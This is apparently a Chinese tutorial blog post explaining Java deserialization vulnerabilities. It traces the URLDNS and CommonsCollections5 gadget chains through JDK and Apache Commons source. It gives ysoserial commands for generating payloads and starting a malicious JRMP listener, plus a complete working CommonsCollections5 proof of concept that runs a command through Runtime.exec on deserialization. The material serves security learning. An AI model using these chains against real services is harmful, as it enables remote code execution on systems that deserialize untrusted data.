一、    什么是序列化

序列化的本质是，由于对象比较抽象不好传输，于是将对象转换为一种规律的字符串方便于传输，比如php中的序列化对象
O:4:"test":2:{s:3:"str";s:5:"luoke";s:3:"int";i:10;}
Java序列化之后成了二进制文件，没有那么直观。

当然，普通的字符串，数字之类的也能序列化，但它们不序列化也很容易传输。
反序列化发生的场景特征，就是反序列化的二进制文件头，如图是ACED，base64编码之后是rO0A，如果在文件流量里发现，可以尝试利用。同理，有些服务可能直接传输class，class文件头为CAFE，base64编码后是yv66。不过有时候也会用json，xml，压缩的方式传输。
我们用文件来存储序列化字符串，序列化demo如下。
Luoke.java

package test;import java.io.*;
public class Luoke implements java.io.Serializable{   private String name = "luoke";   public String age = "18";   public void printname(){      System.out.println("This is the "+this.name+this.age);   }}Test.javapackage test;import java.io.*;

public class Test {    public static void main(String[] args) throws Exception {        Luoke luoke = new Luoke();        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("1.ser"));           oos.writeObject(luoke);        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));        ois.readObject();        System.out.println("ok");}}

可以看到，和php的serialize和unserialize对应的就是writeObject和readObject，这分别为序列化和反序列化过程。
Java的序列化有一定限制，必须是实现了序列化接口的类才能够被序列化，也就是implements Serializable。除此之外，被transient修饰的属性也不参与序列化过程。
readObject之后一个Luoke类的对象就被创建出来，如果想创建一个变量接受它，需要这样写。

        Luoke luoke2 = (Luoke)ois.readObject();        luoke2.printname();

到此为止，其实序列化反序列化过程其实都没有什么漏洞，即使创建了对象没有变量去接受它，然后执行其中的方法，也造不成什么危害。
反序列化漏洞的关键出现在readObject上，反序列化必定执行readObject方法，而在执行java.io.ObjectInputStream.readObject()之前，会先尝试执行反序列化的类的readObject方法，如果这个类重构了readObject方法，错误的调用了一些危险方法，则会造成漏洞。
我们在Luoke类中重写readObject方法，可以直观的感受出来。

package test;import java.io.*;
public class Luoke implements java.io.Serializable{   private String name = "luoke";   public String age = "18";   public void printname(){      System.out.println("This is the "+this.name+this.age);   }   private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{       in.defaultReadObject();       Runtime.getRuntime().exec("calc.exe");   }}

也就是说，这个readObject起到了和php中的__destruct()的效果，更确切来说，是__wakeup()的效果。

二、    反序列化的利用


Java反序列化和php相同的是，php反序列化通过POP链最终要找到一个落脚点（RCE），这个落脚点一般都是开发自己写的。java通过gadget也要找一个落脚点，而这个落脚点在java标准库和一些常用库就有。
在反序列化的工具ysoserial上就集成了各种常用gadget，其中最简单的就是URLDNS。
https://github.com/frohoff/ysoserial
这个东西该怎么用呢？其实很多java反序列化的poc都为我们演示了。
java -jar ysoserial.jar    就可以看到有哪些gadget，它们适合的扩展库或者JDK版本。

回到Test.java上，注释掉writeObject的代码，假设1.ser这个文件路径我们可控，我们可以构造出一个恶意反序列化文件，来进行DNS查询。
java -jar ysoserial.jar URLDNS "http://0kjvkf.dnslog.cn" > 1.ser
然后替换掉1.ser，执行

绝大部分反序列化漏洞都是这样生成payload并利用的，只不过1.ser可能需要经过复杂编码，或者藏在RMI服务中使用。
更常用的CommonsCollections4。
java -jar ysoserial.jar CommonsCollections4 "ping dnslog.cn"
起一个恶意RMI服务，一旦有人连接它，就发送恶意反序列化字节的payload
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 5555 CommonsCollections4 " ping dnslog.cn "
接下我们通过对URLDNS的分析来了解具体是如何造成危害的。

三、    URLDNS


URLDNS是一个泛用性最广的反序列化，无需任何扩展库，通杀所有JDK版本，而且有DNS出外网的特性，非常容易拿来确认是否存在反序列化。
而且其原理简单，也适合拿来作为反序列化入门。
前面我们用ysoserial生成了URLDNS payload，实际上可以自写URLDNS的payload，来看网上的写法。

package test;import java.io.*;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;

public class Test {    public static void main(String[] args) throws Exception {        HashMap hashMap = new HashMap();          URL url = new URL("http://wpu3mq.dnslog.cn");          Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");          f.setAccessible(true);          f.set(url, 0);          hashMap.put(url, "111");          f.set(url, -1);        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("1.ser"));        oos.writeObject(hashMap);        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));        ois.readObject();        System.out.println("ok");    }}

这里代码分三部分，第一部分是创建hashmap和url对象，并使用hashmap的put方法。

HashMap hashMap = new HashMap();URL url = new URL("http://wpu3mq.dnslog.cn");hashMap.put(url, "111");

第二部分是关于f的。

Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");f.setAccessible(true);f.set(url, 0);f.set(url, -1);

第三部分是反序列的代码，不赘述。
如果单独使用第一部分代码，你会发现直接发起了DNS请求。

这个111当然无所谓，也就是说直接给hashmap的put方法传入一个URL对象，就会向这个地址发起DNS请求，我们来看一下hashmap类，看看为什么会发起请求。

    public V put(K key, V value) {        return putVal(hash(key), key, value, false, true);    }

putVal方法是记录键值对的方法，过程是putVal()——newNode()——Node()

        Node(int hash, K key, V value, Node<K,V> next) {            this.hash = hash;            this.key = key;            this.value = value;            this.next = next;        }

也就是说put方法最终会将hash(key)，key，value记录下来，所以重点是hash(key)

    static final int hash(Object key) {        int h;        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);    }

key不为空执行key.hashCode()，key是URL，再看URL里的hashcode()

    transient URLStreamHandler handler;private int hashCode = -1;……    public synchronized int hashCode() {        if (hashCode != -1)            return hashCode;
        hashCode = handler.hashCode(this);        return hashCode;    }

如果hashCode不为-1，返回hashCode跳出，也就是如果hashCode为其他值，才会执行handler.hashCode(this)，hashCode默认为-1，这显然是为了只算一次hash。而handler是什么呢，URLStreamHandler类，继续跟进。

    protected int hashCode(URL u) {        int h = 0;
        // Generate the protocol part.        String protocol = u.getProtocol();        if (protocol != null)            h += protocol.hashCode();
        // Generate the host part.        InetAddress addr = getHostAddress(u);        if (addr != null) {            h += addr.hashCode();        } else {            String host = u.getHost();            if (host != null)                h += host.toLowerCase().hashCode();        }
        // Generate the file part.        String file = u.getFile();        if (file != null)            h += file.hashCode();
        // Generate the port part.        if (u.getPort() == -1)            h += getDefaultPort();        else            h += u.getPort();
        // Generate the ref part.        String ref = u.getRef();        if (ref != null)            h += ref.hashCode();
        return h;    }

关键是getHostAddress(u)，没有条件直接执行，u是this也就是url对象，从这个名字就看得出getHostAddress和发起请求有关，至此无需再向下跟了。我们明白了为什么put可以触发DNS请求，链如下。
HashMap.put()——HashMap.hash()——URL.hashCode()——URLStreamHandler.hashCode()——URLStreamHandler.getHostAddress()
反序列化过程当然没有put，而是靠readObject的，但我们看HashMap. readObject()，会发现过程完全一样。

    private void readObject(java.io.ObjectInputStream s)        throws IOException, ClassNotFoundException {        // Read in the threshold (ignored), loadfactor, and any hidden stuff        s.defaultReadObject();        reinitialize();……            for (int i = 0; i < mappings; i++) {                @SuppressWarnings("unchecked")                    K key = (K) s.readObject();                @SuppressWarnings("unchecked")                    V value = (V) s.readObject();                putVal(hash(key), key, value, false, false);            }        }    }

那么我们能不能只靠第一部分代码和第三部分代码构造出反序列化代码呢？比如这样。

package test;import java.io.*;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;
public class Test {    public static void main(String[] args) throws Exception {        HashMap hashMap = new HashMap();          URL url = new URL("http://z5ztue.dnslog.cn");          hashMap.put(url, "111");        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("1.ser"));        oos.writeObject(hashMap);        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));        ois.readObject();        System.out.println("ok");    }}

首先要解决一个问题，在put的过程中已经发起了一次DNS请求，put和readObject都是在同一台机器上进行的。而第二次DNS请求会因为缓存的问题不再发生，这也是为什么我们无限ping DNS无法一直接受到回应。
不过这个问题很好解决，可以先注释掉readObject，然后断网，执行代码。再注释掉put，恢复readObject，联网，执行代码，这样就不会进行第一次DNS请求。
但即使这样做，我们会发现readObject并未进行DNS请求，这是为什么呢？关键就是hashCode=-1的问题。

    public synchronized int hashCode() {        if (hashCode != -1)            return hashCode;
        hashCode = handler.hashCode(this);        return hashCode;    }

在执行handler.hashCode(this)之后，hashCode值变化了，不再是-1，所以反序列化之后直接返回hashCode，具体是多少，我们可以下断点看到。

这样经过反序列化出来的对象，hashcode也为2133919961，从而无法执行handler.hashCode(this)。
因此，我们必须在put之后，将hashCode重置为-1，同理，我们也可以在put之前，将hashCode设置为非-1的值，这样就避免了在put的时候发起第一次DNS请求来混淆我们判定反序列化是否成功。
如果实际测试过程中，我们在本地生成payload的过程中就发起了DNS请求，在靶机上尝试反序列化，回头检测发现有DNS记录。结果其实是自己本地发起的，而不是靶机发起的，反序列化根本没有成功，这样就很尴尬。
这正是第二段代码的用处。

Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");f.setAccessible(true);f.set(url, 0);f.set(url, -1);

这其实是一种反射写法，一般我们创建对象会new一个出来，但java中提供了另一种方法反射，我们可以对比来看一下。

        Luoke luoke = new Luoke();        luoke.age = "18";        luoke.printname();                Luoke luoke2 = (Luoke)Class.forName("test.Luoke").newInstance();        Class.forName("test.Luoke").getField("age").set(luoke2,"17");        Class.forName("test.Luoke").getMethod("printname").invoke(luoke2,null);

为什么有new这种方法还需要用反射机制呢？因为反射更灵活，比如Luoke中的name属性是私有的private，无法直接设置，就可以通过反射来设置。

那么我们就明白了第二段代码的用处，通过反射的方式，先将hashCode设置为0，跳过DNS查询，然后put URL和111，再将hashCode设置为-1，序列化写入二进制文件，最终反序列化的时候进行了DNS查询。
在php反序列化中，我们是直接修改源码中的私有属性，直接赋值或者用__construct魔术方法赋值。这里的java反射起到的类似的效果。


四、    CommonsCollections5


查看ysoserial.jar的gadget链，会发现里面有很多CommonsCollections，这是apache发布的标准扩展包，几乎每个java项目都有使用它们，于是它们也成为了最热门和通用的反序列化链，在很多反序列化漏洞中都有它们的身影。
通常一个CommonsCollections反序列化漏洞会有JDK版本和它自身版本的双向限制，所以我们选择较为通用的CommonsCollections5来分析，要求JDK8和CommonsCollections:3.1。
像URLNDS一样，在项目中导入CommonsCollections:3.1，用ysoserial.jar生成payload来测试是否成功。

成功弹出计算器，再试一试网上流传的POC。

package test;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import javax.management.BadAttributeValueExpException;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;

public class Test {    public static void main(String[] args) throws Exception {        Transformer[] transformers = new Transformer[] {                new ConstantTransformer(Runtime.class),                new InvokerTransformer("getMethod",                        new Class[] {String.class, Class[].class },                        new Object[] {"getRuntime", new Class[0] }),                new InvokerTransformer("invoke",                        new Class[] {Object.class, Object[].class },                        new Object[] {null, new Object[0] }),                new InvokerTransformer("exec",                        new Class[] {String.class },                        new Object[] {"calc"})        };        Transformer transformerChain = new ChainedTransformer(transformers);        Map innerMap = new HashMap();        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");        BadAttributeValueExpException poc = new BadAttributeValueExpException(null);        Field valfield = poc.getClass().getDeclaredField("val");        valfield.setAccessible(true);        valfield.set(poc, entry);        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("1.ser"));           oos.writeObject(poc);        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));        ois.readObject();        System.out.println("ok");}}

那么我们从后往前捋一捋到底是如何触发RCE的。

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");        BadAttributeValueExpException poc = new BadAttributeValueExpException(null);        Field valfield = poc.getClass().getDeclaredField("val");        valfield.setAccessible(true);        valfield.set(poc, entry);

最终执行的是的当然是BadAttributeValueExpException.readObject()，上面明显是用了反射的方式将BadAttributeValueExpException.val设为TiedMapEntry。看代码为什么要这么做。

    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {        ObjectInputStream.GetField gf = ois.readFields();        Object valObj = gf.get("val", null);
        if (valObj == null) {            val = null;        } else if (valObj instanceof String) {            val= valObj;        } else if (System.getSecurityManager() == null                || valObj instanceof Long                || valObj instanceof Integer                || valObj instanceof Float                || valObj instanceof Double                || valObj instanceof Byte                || valObj instanceof Short                || valObj instanceof Boolean) {            val = valObj.toString();        } else { // the serialized object is from a version without JDK-8019292 fix            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();        }    }

其最终目的是触发valObj.toString()，valObj是所有反序列化流中键值为val的对象，也就是val本身，所以实际上是val. toString()。这里的条件很多，我们只能用System.getSecurityManager() == null来触发，而SecurityManager正是一个安全拓展，可以用其禁用比如Runtime.exec方法，也就是说如果开发并未配置SecurityManager，这儿就可以利用。最终触发TiedMapEntry.toString()。

    public String toString()    {        return getKey() + "=" + getValue();    }

TiedMapEntry. toString()的代码很简单，getKey()无用，看getValue()

    public Object getValue()    {        return map.get(key);    }

触发get方法，而map和key值都为TiedMapEntry的两个可控变量，也就是为什么我们要这样写。

        Transformer transformerChain = new ChainedTransformer(transformers);        Map innerMap = new HashMap();        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

接下来是LazyMap.get()，先看下LazyMap.decorate()做了什么

    public static Map decorate(Map map, Transformer factory){        return new LazyMap(map, factory);    }

也就是给map和factory赋值为HashMap和ChainedTransformer。再看get()。

    public Object get(Object key)    {        if(!super.map.containsKey(key))        {            Object value = factory.transform(key);            super.map.put(key, value);            return value;        } else        {            return super.map.get(key);        }    }

目的是触发factory.transform(key)，前面有个判断!super.map.containsKey(key)，直接百度containsKey发现其实就是判断HashMap中是否存在这个key，当然不存在，所以返回false。再跟一个!就是True，因此可以触发ChainedTransformer.transform()，继续跟。

    public Object transform(Object object)    {        for(int i = 0; i < iTransformers.length; i++)            object = iTransformers[i].transform(object);
        return object;    }

代码很简单，iTransformers[i]为自带属性，是个列表，for循环挨个执行列表中的transform方法，每执行一次将object重新赋值再调用，如果列表中的对象都是同一个，就是个递归的写法。

        Transformer[] transformers = new Transformer[] {                new ConstantTransformer(Runtime.class),                new InvokerTransformer("getMethod",                        new Class[] {String.class, Class[].class },                        new Object[] {"getRuntime", new Class[0] }),                new InvokerTransformer("invoke",                        new Class[] {Object.class, Object[].class },                        new Object[] {null, new Object[0] }),                new InvokerTransformer("exec",                        new Class[] {String.class },                        new Object[] {"calc"})        };

结合上图最后的POC代码就明白了，其实不使用反序列化，直接弹计算器可以这样写。

package test;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;

再进一步简化就是反复调用ConstantTransformer.transform()和InvokerTransformer.transform()来执行命令，很显然，这两个方法又跟反射机制息息相关。

五、    java反射


之前跟URLDNS的时候接触到了如何利用反射的方法设置类的私有属性，以及执行类的方法。

        Luoke luoke2 = (Luoke)Class.forName("test.Luoke").newInstance();        Class.forName("test.Luoke").getField("age").set(luoke2,"17");        Class.forName("test.Luoke").getMethod("printname").invoke(luoke2,null);

但注意到，invoke执行方法的时候必须要传入一个对象，但其实如果该方法是静态方法的时候，只需要传入类就行了。Luoke类中加一个静态方法。

   public static void printage(String age){       System.out.println("This is the luoke"+age);   }

直接用反射来调。这里getMethod("printage",String.class)是在指定参数类型。

    Class.forName("test.Luoke").getMethod("printage",String.class).invoke(Class.forName("test.Luoke"),"18");

那么直接用反射来执行Runtime.getRuntime().exec("calc.exe")行吗？
答案是可以的，因为虽然exec不是一个静态方法，但getRuntime是的，也就是说先反射getRuntime生成一个对象，再用反射用调exec。

        Object runtime = Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));        Class.forName("java.lang.Runtime").getMethod("exec",String.class).invoke(runtime, "calc");

合成一下就是

 Class.forName("java.lang.Runtime").getMethod("exec",String.class).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")), "calc");

初步了解了反射的特性，来看InvokerTransformer.transform()

    public InvokerTransformer(String methodName, Class paramTypes[], Object args[])    {        iMethodName = methodName;        iParamTypes = paramTypes;        iArgs = args;    }
    public Object transform(Object input)    {        if(input == null)            return null;        try        {            Class cls = input.getClass();            Method method = cls.getMethod(iMethodName, iParamTypes);            return method.invoke(input, iArgs);        }…    }

其实就是
input.getClass().getMethod(iMethodName, iParamTypes).invoke(input, iArgs)本质上，是调用对象自己的方法，其中iMethodName，iParamTypes，iArgs均可控，如果传入想要的值就变成了。
input.getClass().getMethod("exec", String.class).invoke(input,"calc.exe")
而input不就是我们一直传的key吗？，回溯一下，发现input是foo。

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

如果我们把foo传入Runtime.getRuntime()不就能够执行命令了吗?

        Runtime runtime = Runtime.getRuntime();        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"calc"});        invokerTransformer.transform(runtime);

实际这样写就行了，但很遗憾的是，由于Runtime类不支持反序列化，所以实际foo不能传Runtime.getRuntime()。
在实际环境中，我们传入的是Runtime.class，也就是Class.forName("java.lang.Runtime")，经过getClass()处理，变成了Class.forName("java.lang.Class")。
结果就是
Class.forName("java.lang.Class").getMethod(xxxxxx, xxxxxx).invoke(Class.forName("java.lang.Runtime"), xxxxxx)
这种情况是无法用getMethod获取getRuntime方法的，只能获取java.lang.Class的方法，但我们可以用getMethod获取getMethod，再用invoke来执行getMethod。
先要用反射的方法获取getMethod，传参类型根据getMethod来构造。

        Method getmethod = Class.forName("java.lang.Class").getMethod("getMethod", String.class, Class[].class );

然后再用invoke调用，这样一来，就绕过了限制，可以获取java.lang.Runtime的getRuntime。 

        Object getruntime = getmethod.invoke(Class.forName("java.lang.Runtime"),"getRuntime",null);

这里有个问题，那就是 getMethod是一个动态方法，invoke不是必须传入一个实例化的对象吗？巧妙之处在于，Class.forName("java.lang.Runtime")也就是Runtime.class，虽然是一个类，但同时它也是Class.forName("java.lang.Class")也就是Class.class的对象。想想foo赋值时不正好可以Class foo = Runtime.class这样写的吗？
这就是invokerTransformer.transform第一次传值做的事，要递归，自然是将getruntime再放进去执行。

getruntime.getClass(). getMethod(xxxxxx, xxxxxx).invoke(getruntime, xxxxxx)

此时getRuntime()本身没有被执行，只是获取了，想要执行，需要一次invoke，所以我们接下来必须用反射的方式再构造一次invoke。

        Object invoke = getruntime.getClass().getMethod("invoke", Object.class, Object[].class ).invoke(getruntime,new Object[]{"getRuntime"}, null);

此时才相当Runtime.getRuntime()，也就是

Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))

第二次传值结束，开始第三次传值，这一次就简单很多。

invoke.getClass(). getMethod(xxxxxx, xxxxxx).invoke(invoke, xxxxxx)    invoke.getClass().getMethod("exec", String.class ).invoke(invoke, "calc");

三步合并，并和之前的其他方式对比一下。

        Runtime.getRuntime().exec("calc");                Class.forName("java.lang.Runtime").getMethod("exec",String.class).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")), "calc");                Object getruntime = Class.forName("java.lang.Class").getMethod("getMethod", String.class, Class[].class).invoke(Class.forName("java.lang.Runtime"),"getRuntime",null);        Object invoke = getruntime.getClass().getMethod("invoke", Object.class, Object[].class ).invoke(getruntime,new Object[]{"getRuntime"}, null);        invoke.getClass().getMethod("exec", String.class).invoke(invoke, "calc");

InvokerTransformer三次传入的值也可以确定了。

        Transformer[] transformers = new Transformer[] {                new InvokerTransformer("getMethod",                        new Class[] {String.class, Class[].class },                        new Object[] {"getRuntime", null }),                new InvokerTransformer("invoke",                        new Class[] {Object.class, Object[].class },                        new Object[] {new Object[]{"getRuntime"}, null }),                new InvokerTransformer("exec",                        new Class[] {String.class },                        new Object[] {"calc"})        };

和原来的POC对比一下。

        Transformer[] transformers = new Transformer[] {                new ConstantTransformer(Runtime.class),                new InvokerTransformer("getMethod",                        new Class[] {String.class, Class[].class },                        new Object[] {"getRuntime", new Class[0] }),                new InvokerTransformer("invoke",                        new Class[] {Object.class, Object[].class },                        new Object[] {null, new Object[0] }),                new InvokerTransformer("exec",                        new Class[] {String.class },                        new Object[] {"calc"})        };

有三处不同。
第一处不同是递归的第一步使用了new  ConstantTransformer(Runtime.class)
这是因为我们给foo赋值Runtime.class了，而原POC foo不重要，而在递归的第一步利用ConstantTransformer.transform()重新给object赋值Runtime.class，看代码就懂了。

    public ConstantTransformer(Object constantToReturn)    {        iConstant = constantToReturn;    }
    public Object transform(Object input)    {        return iConstant;    }

第二处不同是new Class[0]和new Object[0]被我换成了null，这个是因为getRuntime本来就不需要参数。
第三处不同就是在用反射调用invoke的时候，原POC传了一个null，而我传的是new Object[]{"getRuntime"}。
这是invoke的特性，前面我们描述的不准确，只有静态方法的时候，invoke第一个参数才可以是类，但其实第一个参数是null或者任意值都可以，比如这样。

Class.forName("java.lang.Runtime").getMethod("exec",String.class).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null), "calc");

最后，构造出自己的CommonsCollections5 POC吧。

package test;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import javax.management.BadAttributeValueExpException;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;

public class Test {    public static void main(String[] args) throws Exception {        Transformer[] transformers = new Transformer[] {                new InvokerTransformer("getMethod",                        new Class[] {String.class, Class[].class },                        new Object[] {"getRuntime", null }),                new InvokerTransformer("invoke",                        new Class[] {Object.class, Object[].class },                        new Object[] {new Object[]{"getRuntime"}, null }),                new InvokerTransformer("exec",                        new Class[] {String.class },                        new Object[] {"calc"})        };        Transformer transformerChain = new ChainedTransformer(transformers);        Map innerMap = new HashMap();        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);        Class foo = Runtime.class;        TiedMapEntry entry = new TiedMapEntry(lazyMap, foo);        BadAttributeValueExpException poc = new BadAttributeValueExpException(null);        Field valfield = poc.getClass().getDeclaredField("val");        valfield.setAccessible(true);        valfield.set(poc, entry);        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("1.ser"));           oos.writeObject(poc);        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));        ois.readObject();        System.out.println("ok");}}
